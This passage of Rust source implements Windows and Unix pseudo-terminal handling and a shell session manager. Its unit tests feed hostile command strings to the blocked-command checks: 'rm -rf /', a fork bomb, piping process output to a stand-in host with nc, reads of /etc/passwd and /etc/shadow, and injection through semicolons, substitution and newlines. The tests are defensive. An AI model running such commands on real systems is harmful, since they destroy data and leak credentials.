                    output_read: OwnedHandle::from_raw_handle(output_read.0 as RawHandle),
                })
            }
        }

        pub fn write(&mut self, data: &[u8]) -> Result<()> {
            use std::os::windows::io::AsRawHandle;
            use windows::Win32::Storage::FileSystem::WriteFile;

            unsafe {
                let mut written: u32 = 0;
                WriteFile(
                    HANDLE(self.input_write.as_raw_handle() as isize),
                    Some(data),
                    Some(&mut written),
                    None,
                )?;
            }
            Ok(())
        }

        pub fn resize(&mut self, cols: u16, rows: u16) -> Result<()> {
            unsafe {
                let size = COORD {
                    X: cols as i16,
                    Y: rows as i16,
                };
                ResizePseudoConsole(self.hpc, size)?;
            }
            Ok(())
        }

        pub fn get_reader(&self) -> WindowsPtyReader {
            WindowsPtyReader {
                handle: HANDLE(self.output_read.as_raw_handle() as isize),
            }
        }

        pub fn close(&mut self) -> Result<()> {
            unsafe {
                ClosePseudoConsole(self.hpc);
                CloseHandle(self.process_info.hProcess)?;
                CloseHandle(self.process_info.hThread)?;
            }
            Ok(())
        }
    }

    pub struct WindowsPtyReader {
        handle: HANDLE,
    }

    impl Read for WindowsPtyReader {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            use windows::Win32::Storage::FileSystem::ReadFile;

            unsafe {
                let mut read: u32 = 0;
                match ReadFile(self.handle, Some(buf), Some(&mut read), None) {
                    Ok(_) => Ok(read as usize),
                    Err(e) => Err(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        e.to_string(),
                    )),
                }
            }
        }
    }
}

#[cfg(target_os = "windows")]
pub use windows_pty::WindowsConPty;

// =============================================================================
// Unix PTY Implementation
// =============================================================================

#[cfg(not(target_os = "windows"))]
mod unix_pty {
    use super::*;
    use nix::libc::{self, ioctl, TIOCSWINSZ};
    use nix::pty::{openpty, Winsize};
    use nix::sys::signal::{kill, Signal};
    use nix::unistd::{dup2, execvp, fork, setsid, ForkResult, Pid};
    use std::ffi::CString;
    use std::fs::File;
    use std::io::{Read, Write};
    use std::os::fd::{AsRawFd, FromRawFd, IntoRawFd, RawFd};

    pub struct UnixPty {
        master_fd: RawFd,
        child_pid: Pid,
        master_file: File,
    }

    impl UnixPty {
        pub fn new(shell: &str, cols: u16, rows: u16) -> Result<Self> {
            let winsize = Winsize {
                ws_row: rows,
                ws_col: cols,
                ws_xpixel: 0,
                ws_ypixel: 0,
            };

            let pty = openpty(Some(&winsize), None)?;
            // nix 0.27+ returns OwnedFd - get raw fd before consuming
            let master_raw = pty.master.as_raw_fd();
            let slave_raw = pty.slave.as_raw_fd();

            match unsafe { fork() }? {
                ForkResult::Child => {
                    // Child process - drop master (OwnedFd closes it)
                    drop(pty.master);
                    setsid().ok();

                    // Set up slave as controlling terminal
                    dup2(slave_raw, 0).ok();
                    dup2(slave_raw, 1).ok();
                    dup2(slave_raw, 2).ok();

                    // Drop slave (OwnedFd closes original fd)
                    drop(pty.slave);

                    // Execute shell
                    let shell_cstr = CString::new(shell).unwrap_or_else(|_| std::process::exit(1));
                    let args = [shell_cstr.clone()];
                    execvp(&shell_cstr, &args).ok();
                    std::process::exit(1);
                }
                ForkResult::Parent { child } => {
                    // Drop slave (OwnedFd closes it)
                    drop(pty.slave);

                    // Convert master OwnedFd to File (IntoRawFd consumes without closing)
                    let master_raw = pty.master.into_raw_fd();
                    let master_file = unsafe { File::from_raw_fd(master_raw) };

                    Ok(Self {
                        master_fd: master_raw,
                        child_pid: child,
                        master_file,
                    })
                }
            }
        }

        pub fn write(&mut self, data: &[u8]) -> Result<()> {
            self.master_file.write_all(data)?;
            Ok(())
        }

        pub fn resize(&mut self, cols: u16, rows: u16) -> Result<()> {
            let winsize = Winsize {
                ws_row: rows,
                ws_col: cols,
                ws_xpixel: 0,
                ws_ypixel: 0,
            };

            unsafe {
                ioctl(self.master_fd, TIOCSWINSZ, &winsize);
            }

            Ok(())
        }

        pub fn get_reader(&self) -> UnixPtyReader {
            UnixPtyReader { fd: self.master_fd }
        }

        pub fn close(&mut self) -> Result<()> {
            kill(self.child_pid, Signal::SIGTERM).ok();
            Ok(())
        }
    }

    pub struct UnixPtyReader {
        fd: RawFd,
    }

    impl Read for UnixPtyReader {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            // Use libc::read directly since nix::unistd::read now requires &impl AsFd
            unsafe {
                let ret = libc::read(self.fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len());
                if ret < 0 {
                    Err(std::io::Error::last_os_error())
                } else {
                    Ok(ret as usize)
                }
            }
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub use unix_pty::UnixPty;

// =============================================================================
// Shell Session Manager
// =============================================================================

/// Manages multiple shell sessions
pub struct ShellSessionManager {
    sessions: Arc<RwLock<HashMap<String, Arc<Mutex<ShellSession>>>>>,
    max_sessions: usize,
}

impl ShellSessionManager {
    pub fn new(max_sessions: usize) -> Self {
        Self {
            sessions: Arc::new(RwLock::new(HashMap::new())),
            max_sessions,
        }
    }

    /// Create a new shell session
    pub async fn create_session(
        &self,
        config: ShellConfig,
        output_tx: mpsc::Sender<ShellOutput>,
    ) -> Result<String> {
        let sessions = self.sessions.read().await;
        if sessions.len() >= self.max_sessions {
            return Err(anyhow!(
                "Maximum number of shell sessions ({}) reached",
                self.max_sessions
            ));
        }
        drop(sessions);

        let mut session = ShellSession::new(config, output_tx);
        let session_id = session.session_id.clone();

        session.start().await?;

        self.sessions
            .write()
            .await
            .insert(session_id.clone(), Arc::new(Mutex::new(session)));

        info!(session_id = %session_id, "Shell session created");
        Ok(session_id)
    }

    /// Get a session by ID
    pub async fn get_session(&self, session_id: &str) -> Option<Arc<Mutex<ShellSession>>> {
        self.sessions.read().await.get(session_id).cloned()
    }

    /// Handle input for a session
    pub async fn handle_input(&self, session_id: &str, input: ShellInput) -> Result<()> {
        let session = self
            .get_session(session_id)
            .await
            .ok_or_else(|| anyhow!("Session not found: {}", session_id))?;

        let result = session.lock().await.handle_input(input).await;
        result
    }

    /// Terminate a session
    pub async fn terminate_session(&self, session_id: &str, reason: &str) -> Result<()> {
        if let Some(session) = self.sessions.write().await.remove(session_id) {
            session.lock().await.terminate(reason).await?;
        }
        Ok(())
    }

    /// List active sessions
    pub async fn list_sessions(&self) -> Vec<(String, SessionState)> {
        let sessions = self.sessions.read().await;
        let mut result = Vec::new();

        for (id, session) in sessions.iter() {
            let state = session.lock().await.state().await;
            result.push((id.clone(), state));
        }

        result
    }

    /// Clean up terminated sessions
    pub async fn cleanup_terminated(&self) {
        let mut sessions = self.sessions.write().await;
        sessions.retain(|_, session| {
            let state = futures::executor::block_on(async { session.lock().await.state().await });
            state != SessionState::Terminated
        });
    }
}

/// Global shell session manager
static SHELL_MANAGER: std::sync::OnceLock<ShellSessionManager> = std::sync::OnceLock::new();

/// Get or initialize the shell session manager
pub fn get_shell_manager() -> &'static ShellSessionManager {
    SHELL_MANAGER.get_or_init(|| ShellSessionManager::new(10))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dangerous_command_detection() {
        let config = ShellConfig::default();
        let (tx, _rx) = mpsc::channel(10);
        let session = ShellSession::new(config, tx);

        assert!(session
            .check_dangerous_command("rm -rf /tmp/test")
            .is_some());
        assert!(session.check_dangerous_command("shutdown now").is_some());
        assert!(session.check_dangerous_command("ls -la").is_none());
    }

    #[test]
    fn test_blocked_command_detection() {
        let config = ShellConfig::default();
        let (tx, _rx) = mpsc::channel(10);
        let session = ShellSession::new(config, tx);

        assert!(session.is_blocked_command("rm -rf /"));
        assert!(session.is_blocked_command(":(){:|:&};:"));
        assert!(!session.is_blocked_command("ls -la"));
    }

    #[test]
    fn test_command_injection_blocked() {
        let config = ShellConfig::default();
        let (tx, _rx) = mpsc::channel(10);
        let session = ShellSession::new(config, tx);

        // Command chaining via semicolon
        assert!(session.is_blocked_command("ls /tmp; rm -rf /"));
        assert!(session.is_blocked_command("whoami;cat /etc/passwd"));

        // Command chaining via AND/OR
        assert!(session.is_blocked_command("ls && rm -rf /"));
        assert!(session.is_blocked_command("ls || rm -rf /"));

        // Pipe to arbitrary command
        assert!(session.is_blocked_command("ps aux | nc attacker.com 4444"));

        // Command substitution
        assert!(session.is_blocked_command("echo `whoami`"));
        assert!(session.is_blocked_command("echo $(cat /etc/passwd)"));

        // Redirection
        assert!(session.is_blocked_command("echo malicious > /etc/passwd"));
        assert!(session.is_blocked_command("cat < /etc/shadow"));

        // Newline injection
        assert!(session.is_blocked_command("ls\nrm -rf /"));
        assert!(session.is_blocked_command("ls\r\nrm -rf /"));

        // Clean commands should pass
        assert!(!session.is_blocked_command("ls -la /tmp"));
        assert!(!session.is_blocked_command("ps aux"));
        assert!(!session.is_blocked_command("whoami"));
    }

    #[tokio::test]
    async fn test_blocked_input_emits_error_without_shell_handle() {
        let config = ShellConfig::default();
        let (tx, mut rx) = mpsc::channel(10);
        let mut session = ShellSession::new(config, tx);

        session
            .handle_input(ShellInput::Data {
                data: "rm -rf /".to_string(),
            })
            .await
            .unwrap();

        match rx.recv().await.unwrap() {
            ShellOutput::Error { message } => {
                assert_eq!(message, "Command blocked for security reasons");
            }
            output => panic!("expected blocked command error, got {:?}", output),
        }
    }

    #[tokio::test]
    async fn test_dangerous_input_requires_confirmation_without_shell_handle() {
        let config = ShellConfig::default();
        let (tx, mut rx) = mpsc::channel(10);
        let mut session = ShellSession::new(config, tx);

        session
            .handle_input(ShellInput::Data {
                data: "shutdown now".to_string(),
            })
            .await
            .unwrap();

        match rx.recv().await.unwrap() {
            ShellOutput::DangerousCommandWarning {
                command,
                warning,
                command_id,
            } => {
                assert_eq!(command, "shutdown now");
                assert!(!command_id.is_empty());
                assert!(warning.contains("System shutdown"));
            }
            output => panic!("expected dangerous command warning, got {:?}", output),
        }
    }

    #[tokio::test]
    async fn test_allowlist_denial_emits_error_without_shell_handle() {
        let config = ShellConfig {
            allowlist: Some(vec!["ls".to_string()]),
            ..ShellConfig::default()
        };
        let (tx, mut rx) = mpsc::channel(10);
        let mut session = ShellSession::new(config, tx);

        session
            .handle_input(ShellInput::Data {
                data: "whoami".to_string(),
            })
            .await
            .unwrap();

        match rx.recv().await.unwrap() {
            ShellOutput::Error { message } => {
                assert_eq!(message, "Command 'whoami' not in allowlist");
            }
            output => panic!("expected allowlist error, got {:?}", output),
        }
    }
}
